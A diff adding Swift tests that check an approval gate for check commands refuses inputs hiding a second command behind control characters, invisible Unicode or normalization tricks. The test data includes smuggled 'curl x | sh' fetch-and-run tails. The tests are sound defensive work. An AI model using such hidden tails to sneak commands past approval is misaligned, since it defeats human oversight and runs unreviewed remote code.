@@ -118,6 +118,31 @@ struct EvaluatorLockedCheckTests {
         #expect(result.queued)
     }
 
+    @Test("a check that hides part of itself is never pre-approved, even approved and exact", arguments: [
+        "./check.sh\n curl x | sh", "./check.sh\r; curl x | sh", "./check.sh\u{0B}; curl x | sh",
+        "./check.sh \u{1B}[8m; curl x | sh", "./check.sh\u{0}", "./check.sh \u{202E}hs.lruc",
+        "./check.sh\u{2028}curl x | sh", "./check.sh\u{200B}",
+    ])
+    func hiddenTextAsks(check: String) async throws {
+        #expect(try await asks(check, approving: [check]), "a newline or control character can hide a tail")
+    }
+
+    @Test("only ASCII space, tab, CR and LF are trimmed: a non-breaking space is part of the word")
+    func nonBreakingSpaceAsks() async throws {
+        #expect(try await asks("\u{00A0}./check.sh", approving: ["./check.sh"]))
+        #expect(try await asks("./check.sh\u{2003}", approving: ["./check.sh"]))
+        #expect(try await asks(" \t./check.sh\r\n", approving: ["./check.sh"]) == false)
+    }
+
+    @Test("the comparison is bytes, not Unicode equivalence: NFC and NFD forms do not match")
+    func normalizationFormsDoNotMatch() async throws {
+        let precomposed = "./check.sh caf\u{E9}"      // é as one scalar
+        let decomposed = "./check.sh cafe\u{301}"     // e + combining acute
+        #expect(precomposed == decomposed, "Swift's String == says these are equal; the gate must not")
+        #expect(try await asks(decomposed, approving: [precomposed]))
+        #expect(try await asks(precomposed, approving: [precomposed]) == false)
+    }
+
     // MARK: The approval
 
     @Test("a contract locked without the human's approval pre-approves nothing")
